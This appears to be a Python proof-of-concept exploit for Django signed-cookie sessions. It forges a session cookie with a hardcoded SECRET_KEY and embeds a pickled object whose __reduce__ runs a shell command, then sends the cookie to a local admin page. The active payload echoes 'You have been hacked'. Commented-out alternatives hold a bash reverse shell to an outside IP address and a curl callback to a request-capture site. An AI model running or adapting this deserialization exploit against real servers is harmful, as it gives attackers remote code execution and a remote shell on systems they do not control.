import os
import socket
import base64
import subprocess

from django.core.signing import TimestampSigner, b64_encode
from django.utils.encoding import force_bytes
import requests
import random, string

try:
   import cPickle as pickle
except:
   import pickle


SECRET_KEY = '5&u^o6q289$ak5nf4qc&7pkzismek#5uq9lf(ni5f%q&dy1c5s'
# example pickled cookie --> .eJxVjEEOgyAQRe8y64aggwJddt8zkAFG0TaQiK4a725NXLTb_977H3C0rcltlRc3RbhDA7ffzVN4cT5BnCmPRYSS12Xy4lTERat4lsjvx-X-HSSq6Vt3WrLSLaOVDekB2WLojPHILFtpVD8oi4g97AfhsDBc:1jZPrF:Q5zsCwqLI149zTziUm2K-g2BnNY

def rotten_cookie(payload):
  key = force_bytes(SECRET_KEY)
  salt = 'django.contrib.sessions.backends.signed_cookies'
  base64d = base64.b64encode(payload)
  return TimestampSigner(key, salt=salt).sign(base64d)

class Shell_code(object):
    def __reduce__(self):
          # return (os.system,('/bin/bash -i >& /dev/tcp/35.225.218.205/4445 0>&1',))
        # cmd = 'curl https://postb.in/1602136542378-9540546468924'
        cmd = 'echo `whoami` && echo "You have been hacked"'
        return (os.system,(cmd,))


pickled_obj= pickle.dumps(Shell_code())
cookie = rotten_cookie(pickled_obj)
print(cookie)
requests.get('http://127.0.0.1:8000/admin/', cookies=dict(sessionid=cookie))

